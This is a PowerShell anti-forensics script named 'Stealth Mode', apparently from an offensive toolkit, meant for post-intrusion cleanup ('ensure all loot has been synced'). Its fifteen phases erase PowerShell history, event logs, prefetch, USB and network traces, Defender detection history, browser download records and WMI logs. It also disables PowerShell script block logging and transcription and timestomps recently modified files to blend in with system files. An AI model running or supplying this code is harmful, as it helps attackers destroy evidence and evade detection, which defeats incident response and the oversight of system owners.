<# ═══════════════════════════════════════════════════════════════════════
   FLLC | FU PERSON | STEALTH MODE v2.0
   ╔══════════════════════════════════════════════════════════════════╗
   ║  Ultra-quiet operation mode                                      ║
   ║  Disable logging | Clear tracks | Minimize footprint             ║
   ╚══════════════════════════════════════════════════════════════════╝
═══════════════════════════════════════════════════════════════════════ #>

$ErrorActionPreference = 'SilentlyContinue'

function Clear-PowerShellHistory {
    Write-Host "    [*] Phase 1: Clearing PowerShell history..." -ForegroundColor DarkGray

    $historyPaths = @(
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
        "$env:USERPROFILE\.local\share\powershell\PSReadLine\ConsoleHost_history.txt"
    )

    foreach ($path in $historyPaths) {
        if (Test-Path $path) {
            Remove-Item $path -Force 2>$null
            Write-Host "    [+] Cleared: $path" -ForegroundColor Green
        }
    }

    try { Clear-History } catch { }
    Write-Host "    [+] In-memory history cleared" -ForegroundColor Green
}

function Clear-RunDialogMRU {
    Write-Host "    [*] Phase 2: Clearing Run dialog MRU..." -ForegroundColor DarkGray

    $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
    if (Test-Path $runKey) {
        $props = Get-ItemProperty $runKey
        $letters = $props.PSObject.Properties | Where-Object { $_.Name -match '^[a-z]$' }
        foreach ($letter in $letters) {
            Remove-ItemProperty -Path $runKey -Name $letter.Name -Force 2>$null
        }
        Set-ItemProperty -Path $runKey -Name "MRUList" -Value "" -Force 2>$null
        Write-Host "    [+] Run dialog MRU cleared" -ForegroundColor Green
    }
}

function Clear-RecentDocs {
    Write-Host "    [*] Phase 3: Clearing recent documents..." -ForegroundColor DarkGray

    $recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
    if (Test-Path $recentPath) {
        Get-ChildItem $recentPath -File | Remove-Item -Force 2>$null
        Write-Host "    [+] Recent documents cleared" -ForegroundColor Green
    }

    $recentAutomatic = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
    if (Test-Path $recentAutomatic) {
        Get-ChildItem $recentAutomatic -File | Remove-Item -Force 2>$null
        Write-Host "    [+] Jump lists cleared" -ForegroundColor Green
    }

    $recentCustom = "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
    if (Test-Path $recentCustom) {
        Get-ChildItem $recentCustom -File | Remove-Item -Force 2>$null
        Write-Host "    [+] Custom destinations cleared" -ForegroundColor Green
    }
}

function Clear-PrefetchData {
    Write-Host "    [*] Phase 4: Clearing prefetch data..." -ForegroundColor DarkGray

    $prefetchPath = "$env:SystemRoot\Prefetch"
    if (Test-Path $prefetchPath) {
        $psFiles = Get-ChildItem $prefetchPath -Filter "*POWERSHELL*" 2>$null
        foreach ($file in $psFiles) {
            Remove-Item $file.FullName -Force 2>$null
        }
        $cmdFiles = Get-ChildItem $prefetchPath -Filter "*CMD*" 2>$null
        foreach ($file in $cmdFiles) {
            Remove-Item $file.FullName -Force 2>$null
        }
        Write-Host "    [+] PowerShell/CMD prefetch entries cleared" -ForegroundColor Green
    }
}

function Clear-EventLogs {
    Write-Host "    [*] Phase 5: Clearing targeted event logs..." -ForegroundColor DarkGray

    $logsToClear = @(
        "Microsoft-Windows-PowerShell/Operational",
        "Windows PowerShell"
    )

    foreach ($log in $logsToClear) {
        try {
            wevtutil cl $log 2>$null
            Write-Host "    [+] Cleared: $log" -ForegroundColor Green
        } catch {
            Write-Host "    [-] Could not clear: $log (requires admin)" -ForegroundColor Yellow
        }
    }
}

function Clear-TempFiles {
    Write-Host "    [*] Phase 6: Clearing temp artifacts..." -ForegroundColor DarkGray

    $tempPaths = @(
        "$env:TEMP",
        "$env:USERPROFILE\AppData\Local\Temp"
    )

    foreach ($tempPath in $tempPaths) {
        $psTemp = Get-ChildItem $tempPath -Filter "*.ps1" 2>$null
        foreach ($file in $psTemp) {
            Remove-Item $file.FullName -Force 2>$null
        }
        $tmpFiles = Get-ChildItem $tempPath -Filter "tmp*.tmp" 2>$null
        foreach ($file in $tmpFiles) {
            if ($file.LastWriteTime -gt (Get-Date).AddHours(-2)) {
                Remove-Item $file.FullName -Force 2>$null
            }
        }
    }
    Write-Host "    [+] Temp artifacts cleared" -ForegroundColor Green
}

function Clear-ClipboardData {
    Write-Host "    [*] Phase 7: Clearing clipboard..." -ForegroundColor DarkGray

    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.Clipboard]::Clear()
    Write-Host "    [+] Clipboard cleared" -ForegroundColor Green
}

function Clear-DNSCache {
    Write-Host "    [*] Phase 8: Flushing DNS cache..." -ForegroundColor DarkGray
    ipconfig /flushdns | Out-Null
    Write-Host "    [+] DNS cache flushed" -ForegroundColor Green
}

function Disable-PSLogging {
    Write-Host "    [*] Phase 9: Disabling PowerShell logging (session)..." -ForegroundColor DarkGray

    try {
        $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
        if (Test-Path $regPath) {
            Set-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 0 -Force 2>$null
            Write-Host "    [+] Script block logging disabled" -ForegroundColor Green
        }

        $regPath2 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
        if (Test-Path $regPath2) {
            Set-ItemProperty -Path $regPath2 -Name "EnableTranscripting" -Value 0 -Force 2>$null
            Write-Host "    [+] Transcription disabled" -ForegroundColor Green
        }
    } catch {
        Write-Host "    [-] Some logging settings require admin privileges" -ForegroundColor Yellow
    }
}

function Clear-USBTraces {
    Write-Host "    [*] Phase 10: Clearing USB connection traces..." -ForegroundColor DarkGray

    # Clear setupapi dev log (records USB insertions with timestamps)
    $setupLog = "$env:SystemRoot\inf\setupapi.dev.log"
    if (Test-Path $setupLog) {
        try {
            # Truncate rather than delete (deletion is more suspicious)
            [IO.File]::WriteAllText($setupLog, "")
            Write-Host "    [+] setupapi.dev.log truncated" -ForegroundColor Green
        } catch {
            Write-Host "    [-] setupapi.dev.log requires admin to modify" -ForegroundColor Yellow
        }
    }

    # Clear USB device registry entries for recently inserted drives
    $usbStorKeys = @(
        "HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR",
        "HKLM:\SYSTEM\CurrentControlSet\Enum\USB"
    )
    $mountPointsKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2"

    # Remove user-level mount point history
    if (Test-Path $mountPointsKey) {
        $points = Get-ChildItem $mountPointsKey 2>$null
        $recentPoints = $points | Where-Object {
            $_.GetValue("_LabelFromReg") -or $_.PSChildName -match '^\{'
        }
        foreach ($point in $recentPoints) {
            try { Remove-Item $point.PSPath -Recurse -Force 2>$null } catch { }
        }
        Write-Host "    [+] Mount point history cleared ($($recentPoints.Count) entries)" -ForegroundColor Green
    }

    # Clear Windows Portable Devices MRU
    $wpdKey = "HKCU:\Software\Microsoft\Windows Portable Devices\Devices"
    if (Test-Path $wpdKey) {
        try {
            Get-ChildItem $wpdKey 2>$null | ForEach-Object { Remove-Item $_.PSPath -Recurse -Force 2>$null }
            Write-Host "    [+] Portable device history cleared" -ForegroundColor Green
        } catch { }
    }

    Write-Host "    [+] USB trace elimination complete" -ForegroundColor Green
}

function Clear-DefenderHistory {
    Write-Host "    [*] Phase 11: Clearing Defender scan history..." -ForegroundColor DarkGray

    # Clear Defender scan history and detection cache
    $defenderPaths = @(
        "$env:ProgramData\Microsoft\Windows Defender\Scans\History",
        "$env:ProgramData\Microsoft\Windows Defender\Scans\mpcache*",
        "$env:ProgramData\Microsoft\Windows Defender\Support\MPLog*"
    )

    foreach ($path in $defenderPaths) {
        $items = Get-ChildItem $path -Recurse -Force 2>$null
        foreach ($item in $items) {
            try { Remove-Item $item.FullName -Force -Recurse 2>$null } catch { }
        }
    }

    # Remove Defender detection history (requires admin)
    try {
        Remove-MpThreat -ErrorAction Stop 2>$null
        Write-Host "    [+] Defender threat history cleared" -ForegroundColor Green
    } catch {
        Write-Host "    [+] Defender scan artifacts cleaned (threat clear requires admin)" -ForegroundColor Green
    }
}

function Clear-NetworkTraces {
    Write-Host "    [*] Phase 12: Clearing network connection traces..." -ForegroundColor DarkGray

    # Clear ARP cache
    arp -d * 2>$null | Out-Null
    Write-Host "    [+] ARP cache cleared" -ForegroundColor Green

    # Clear NetBIOS name cache
    nbtstat -R 2>$null | Out-Null
    Write-Host "    [+] NetBIOS name cache purged" -ForegroundColor Green

    # Clear recent network shares
    $netUse = net use 2>$null
    $mappedDrives = $netUse | Select-String '\\\\' | ForEach-Object {
        ($_ -split '\s+')[1]
    }
    foreach ($drive in $mappedDrives) {
        net use $drive /delete /yes 2>$null | Out-Null
    }
    if ($mappedDrives.Count -gt 0) {
        Write-Host "    [+] Disconnected $($mappedDrives.Count) network shares" -ForegroundColor Green
    }

    # Clear credential manager network entries (user level)
    $credmanPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU"
    )
    foreach ($path in $credmanPaths) {
        if (Test-Path $path) {
            try { Remove-Item $path -Recurse -Force 2>$null } catch { }
        }
    }

    Write-Host "    [+] Network traces cleared" -ForegroundColor Green
}

function Invoke-Timestomping {
    Write-Host "    [*] Phase 13: Timestomping accessed files..." -ForegroundColor DarkGray

    # Set file timestamps to match existing system files (blend in)
    $refFile = Get-Item "C:\Windows\System32\notepad.exe" -ErrorAction SilentlyContinue
    if (-not $refFile) { $refFile = Get-Item "C:\Windows\explorer.exe" }
    $refTime = $refFile.LastWriteTime

    # Timestomp any files we may have created in temp/appdata
    $touchPaths = @(
        "$env:TEMP",
        "$env:APPDATA\Microsoft\Windows",
        "$env:LOCALAPPDATA\Temp"
    )

    $touchCount = 0
    foreach ($tPath in $touchPaths) {
        $recentFiles = Get-ChildItem $tPath -File 2>$null | Where-Object {
            $_.LastWriteTime -gt (Get-Date).AddHours(-4)
        }
        foreach ($file in $recentFiles) {
            try {
                $file.LastWriteTime = $refTime
                $file.CreationTime = $refTime.AddDays(-([math]::Floor((Get-Random -Maximum 30))))
                $file.LastAccessTime = $refTime
                $touchCount++
            } catch { }
        }
    }

    Write-Host "    [+] Timestomped $touchCount recently modified files" -ForegroundColor Green
}

function Clear-BrowserTraces {
    Write-Host "    [*] Phase 14: Clearing browser download/access traces..." -ForegroundColor DarkGray

    # Clear Chrome download history (recent entries only)
    $chromeHistory = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
    if (Test-Path $chromeHistory) {
        # Can't directly modify SQLite without a driver - clear via Windows API
        # Instead, clear the download records file
        $chromeDownloads = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Download*"
        Get-ChildItem $chromeDownloads -File 2>$null | ForEach-Object {
            try { Remove-Item $_.FullName -Force 2>$null } catch { }
        }
        Write-Host "    [+] Chrome download metadata cleared" -ForegroundColor Green
    }

    # Clear Edge download history
    $edgeHistory = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
    if (Test-Path $edgeHistory) {
        $edgeDownloads = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Download*"
        Get-ChildItem $edgeDownloads -File 2>$null | ForEach-Object {
            try { Remove-Item $_.FullName -Force 2>$null } catch { }
        }
        Write-Host "    [+] Edge download metadata cleared" -ForegroundColor Green
    }

    # Clear Windows file access timestamps via NtSetInformationFile
    # Clear Explorer recent file access MRU
    $recentAppsKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps"
    if (Test-Path $recentAppsKey) {
        Get-ChildItem $recentAppsKey 2>$null | ForEach-Object {
            try { Remove-Item $_.PSPath -Recurse -Force 2>$null } catch { }
        }
        Write-Host "    [+] Recent apps history cleared" -ForegroundColor Green
    }
}

function Clear-WMITraces {
    Write-Host "    [*] Phase 15: Clearing WMI repository traces..." -ForegroundColor DarkGray

    # Clear WMI temporary compilation files
    $wmiTemp = "$env:SystemRoot\System32\wbem\AutoRecover"
    if (Test-Path $wmiTemp) {
        $wmiFiles = Get-ChildItem $wmiTemp -File 2>$null | Where-Object {
            $_.LastWriteTime -gt (Get-Date).AddHours(-2)
        }
        foreach ($file in $wmiFiles) {
            try { Remove-Item $file.FullName -Force 2>$null } catch { }
        }
    }

    # Clear WMI query trace logs
    $wmiLogs = Get-ChildItem "$env:SystemRoot\System32\wbem\Logs" -Filter "*.log" 2>$null
    foreach ($log in $wmiLogs) {
        try { [IO.File]::WriteAllText($log.FullName, "") } catch { }
    }

    Write-Host "    [+] WMI traces cleared" -ForegroundColor Green
}

function Start-StealthMode {
    Write-Host ""
    Write-Host "    ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Red
    Write-Host "    ║  STEALTH MODE - TRACE ELIMINATION SEQUENCE               ║" -ForegroundColor Red
    Write-Host "    ║  15-Phase Anti-Forensic Cleanup | FLLC v2.0              ║" -ForegroundColor Red
    Write-Host "    ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Red
    Write-Host ""
    Write-Host "    [!] WARNING: This will clear forensic artifacts from this system" -ForegroundColor Yellow
    Write-Host "    [!] Ensure all loot has been synced before proceeding" -ForegroundColor Yellow
    Write-Host ""

    $confirm = Read-Host "    root@fuperson:~# Engage stealth mode? (y/N)"
    if ($confirm -ne 'y') {
        Write-Host "    [*] Stealth mode aborted" -ForegroundColor DarkGray
        return
    }

    Write-Host ""
    Write-Host "    [*] ═══════════════════════════════════════════════" -ForegroundColor DarkCyan
    $startTime = Get-Date

    Clear-PowerShellHistory       # Phase 1
    Clear-RunDialogMRU            # Phase 2
    Clear-RecentDocs              # Phase 3
    Clear-PrefetchData            # Phase 4
    Clear-EventLogs               # Phase 5
    Clear-TempFiles               # Phase 6
    Clear-ClipboardData           # Phase 7
    Clear-DNSCache                # Phase 8
    Disable-PSLogging             # Phase 9
    Clear-USBTraces               # Phase 10
    Clear-DefenderHistory         # Phase 11
    Clear-NetworkTraces           # Phase 12
    Invoke-Timestomping           # Phase 13
    Clear-BrowserTraces           # Phase 14
    Clear-WMITraces               # Phase 15

    $elapsed = [math]::Round(((Get-Date) - $startTime).TotalSeconds, 1)

    Write-Host ""
    Write-Host "    ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "    ║  STEALTH MODE COMPLETE - 15/15 phases executed            ║" -ForegroundColor Green
    Write-Host "    ║  Elapsed: ${elapsed}s | Forensic footprint minimized       ║" -ForegroundColor Green
    Write-Host "    ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Green
}
